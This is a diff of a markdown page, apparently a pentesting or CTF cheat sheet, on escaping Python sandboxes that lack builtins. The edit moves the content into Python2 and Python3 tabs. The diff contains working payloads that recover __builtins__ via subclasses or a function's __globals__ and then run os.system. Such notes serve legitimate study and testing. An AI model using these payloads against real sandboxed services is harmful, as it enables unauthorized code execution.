@@ -69,11 +69,8 @@ system('ls')
 
 ### If No builtin module : python2 present
 
-* Restore builtin using its sub-modules
-  * `__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__`
-  * `__builtins__['__import__']('os').system('whoami')`
-* other methods
-
+{% tabs %}
+{% tab title="Python2" %}
 ```python
 #Try to reload __builtins__
 reload(__builtins__)
@@ -98,10 +95,14 @@ __builtins__["__import__"]('os').system('ls')
 # Or you could obtain the builtins from a defined function
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
+{% endtab %}
 
-### if No builtin module : python3
-
-* `get_flag.__globals__['__builtins__'].__import__("os").system("ls")`
+{% tab title="Python3" %}
+```text
+get_flag.__globals__['__builtins__'].__import__("os").system("ls")
+```
+{% endtab %}
+{% endtabs %}
 
 ## Time Commands list
 
